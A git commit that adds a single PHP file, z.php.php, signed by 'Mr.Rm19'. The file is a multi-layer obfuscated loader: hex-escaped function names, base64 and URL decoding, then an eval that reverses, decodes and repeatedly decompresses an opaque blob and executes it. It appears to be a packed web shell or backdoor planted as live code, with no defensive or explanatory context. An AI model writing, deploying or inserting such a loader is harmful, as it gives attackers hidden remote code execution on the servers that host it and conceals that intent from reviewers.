7ee333304ab891a4b25b4bb1caf19952158937b6
rdbelz <102173535+rdbelz@users.noreply.github.com>
2022-03-25 04:44:19 +0700

    Create z.php.php

---
+++ z.php.php
@@ -0,0 +1,15 @@
+<?php
+/*
+ramdan19id@gmail.com - Mr.Rm19
+*/
+
+$ramdan19idatgmaildotcom = "\x68\x74\x6d\x6c\x73\x70\x65\x63\x69\x61\x6c" . "c" . "\x68\x61\x72\x73\x5f" . "\x64\x65\x63\x6f" . "de";
+$bella = "\x72\x61\x77\x75" . "r" . "\x6c\x64\x65\x63\x6f\x64\x65";
+$bapakupahlawanku = "\x62\x61\x73\x65\x36\x34" . "_" . "\x64\x65\x63\x6f\x64\x65";
+$Rm19 = "\x52\x6d\x31\x39";
+$upzz = "\x72\x61\x6d\x64\x61\x6e\x6d\x61\x75\x6c\x61\x6e\x61\x67\x61\x6e\x74\x65\x6e\x67";
+$akusygbella = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHJhbWRhbnN5Z2JlbGxhJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
+$ramdansygbella = "063mTFLhiABA/tyLek/UU3eu3kIEDjgJP/Mheh/nrUUh6o07ZuMl+++C27T198oTif6llWf5dsVeF+lPzH9SYDuo0ShO3quDcp3Nmqr7wv+32237qtTLGftJMjoP9zy62EvtJ+aeQvuqZ78RNPakrvpr6STOe0SVA/a+wN7+KKL2jFLwGmaMx/KUrR9X0ZY4g1MqbFqWkPjOL256h0SAgxWaw+Ie+3O/3NIC8sm6qNi9khzsB45DUgORadYAh0Sv9bYcg1oeiG5TTUjlN3ivLV66tQUL+1bzvSdajnHgwUcwcyNw19u5WmTCnPw8jQs0sRMgsHmVr/aR82/H0yNaNLnAMiMH2aP7iZeudcUDz3ktUbtaYsdbMkGqPY4ImmNY91gNUz7WF+5co1DVEMTrDcwQDZIsf70H1r3gxMioOslO2FglXpxqGmFonZ35MgIjYlODj1aXO/a24DyC3TNO1gEcD1UwyBSTmj/dwBkw0rmV/WHyPIAqoNi15OOdilzgUzwo60JRdQ8Na5YH5++MrhjaVZ/fV/UatSdHVZtjqm3hx06mfLvRdKjfySOQk4/de8F1pP4VZqC5peVOw1kHWaFJnRsoC/BEyrc9i0o0xyGrJBusLUJ0eXF7eFEfEuK+n3rwjJUWXyx1MWA4sG1hZG1C8AnwZ+ZDxMHK9Ef6hpBYt2PE43lwOjRsvdqm2aFfLJCfQRZyjigeaAnk4d5CHw/LyznZ08R+K1cvlBf5dkAg/YRF5m1T4+6weYh5f3dy65Ub+va7AY9aKbKR635Kyna69zdkkWOns/JHikYCpP5ik4afFnDJ+OepOzVTwzcUSt+F/i31t/JnDYLpJzylm1M8ZKy7ZiuYopyt0N3q3NfFblrkySpRWRV6XexUkyKu/pbGOopYWDe1mPpsfYJXfxF7zx959a/yksmbS/oN99faBKUT4u5FEs9EF1mAIRQYKBnG8Q3KFRJoL1UpoBJhD5PJ80PFwo9brNVdciX/WIQ6BwJe9vgA0HQ/GIQ+B0fAC4fA";
+eval($ramdan19idatgmaildotcom($bella($bapakupahlawanku($akusygbella))));
+exit();
+?>
